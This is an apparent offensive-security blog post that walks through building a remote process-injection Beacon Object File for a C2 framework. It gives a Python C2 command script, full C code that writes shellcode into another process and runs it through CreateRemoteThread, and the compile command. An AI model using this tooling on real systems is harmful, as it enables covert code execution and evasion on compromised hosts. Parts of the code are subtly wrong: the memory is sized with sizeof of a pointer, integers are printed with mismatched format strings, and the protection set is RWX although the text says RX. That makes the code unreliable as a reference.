### Under development
[back to blog](../blog.md)

## Process Injection
This blog will outline a simple process injection in a remote process. The windows API that will be used are the following:

| Windows API | Usage 
| -------- | -------- 
| [Openprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) | Will be used to open the handle of target process. 
| [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) | Will be used for allocating memory in the target process, allocated memory size will depend on the shellcode size. 
| [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) | Writes the shellcode in the allocated memory address.
| [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex) | Will be used for changing the memory permission to read,execute (RX) instead or Read, Write, Execute (RWX).
| [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) | Will be used for creating a thread on the target process inorder to execute our shellcode.
| [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) | Close the open handle.

When creating a BOF, I **highly recommend starting with C code first**. Run it to verify that it works, **and then convert it into a BOF** once confirmed, that it's working convert it to BOF. This will save up some time debugging some issues on the code.

## Aggressor script

This time we will start first with an aggressor script. Edit the script previously used and add the new python function.

```py
<SNIPPED>
def run_procinj(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer() 
    # Get the beacon instance
    demon = Demon(demon_id)

    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get shellcode path
    path = args[0]

    # Check if the shellcode path exists
    if not exists(path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode not found: {path}")
        return False

    # Read the shellcode from the specified path into 'binary' variable
    with open(path, 'rb') as handle:
        binary = handle.read()

    if not binary:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified shellcode is empty")
        return False

    # Add the arguments to the packer
    packer.addbytes(binary)

    # packs the userinput from C2 client
    packer.addstr(args[1])

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process injection on the process ID: {args[1]}")
   
    demon.InlineExecute(task_id, "go", "bin/test2.o", packer.getbuffer(), False)

    return task_id

<SNIPPED>
RegisterCommand(run_procinj, "testbof", "procinj", "Performs a process injection on the target process", 0, "usage: ", "4512")
```

## BOF

When writing BOF, you often use **DECLSPEC_IMPORT** in function declarations like **DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE)** so the linker knows the function is imported from Windows DLL like (e.g., kernel32.dll, advapi32.dll). The DECLSPEC_IMPORT and the $ prefixed symbol names to ensure Beacon can resolve them at runtime. **Module$Function**

Why it matters for BOFs:

- BOFs are compiled as object files (.o) without the standard runtime.
- You don’t link against Windows libraries directly.


More information at [DFR](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_dynamic-func-resolution.htm)


```c
#include <windows.h>
#include "beacon.h"

//kernel32 dll
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);


void go(char* args, int argc){
    
    datap parser;
    DWORD procid;
    DWORD   dwOldProtection = NULL;
    PSTR  shellcode = { 0 };
    DWORD shellcodeLength    = { 0 };
    SIZE_T  sNumberOfBytesWritten = NULL;
    HANDLE pHandle;
    HANDLE rthreadHandle;
    PVOID bufferMemoryaddr;

    //Beacon data parser
    BeaconDataParse(&parser, args, argc);
    

    shellcode = BeaconDataExtract(&parser, &shellcodeLength);
    procid = BeaconDataExtract(&parser, NULL);

    //prints hello world
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Target PID: %s", procid);
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Shellcode length: %s", &shellcodeLength);

    


    pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);
    if (!pHandle){
        BeaconPrintf(CALLBACK_OUTPUT, "[x] Failed to open process error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    bufferMemoryaddr = KERNEL32$VirtualAllocEx(pHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if(!bufferMemoryaddr){
        BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to allocate memory: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Allocated Memory At : 0x%p \n", bufferMemoryaddr);

    if (!KERNEL32$WriteProcessMemory(pHandle, bufferMemoryaddr, shellcode, shellcodeLength, &sNumberOfBytesWritten)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[x] WriteProcessMemory Failed With Error : %d \n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!KERNEL32$VirtualProtectEx(pHandle, bufferMemoryaddr, shellcodeLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[x] KERNEL32$VirtualProtectEx Failed With Error : %d \n", KERNEL32$GetLastError());
        return FALSE;
    }

    rthreadHandle = KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferMemoryaddr, NULL, 0, NULL);
    if(!rthreadHandle){
        BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to create remote thread: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[!] remote thread memory At : 0x%p \n", rthreadHandle);

    KERNEL32$CloseHandle(pHandle);

}
```

```bash
x86_64-w64-mingw32-gcc -c src/procinj.c -w -o bin/test2.o 
```


Reference
- https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

[back to blog](../blog.md)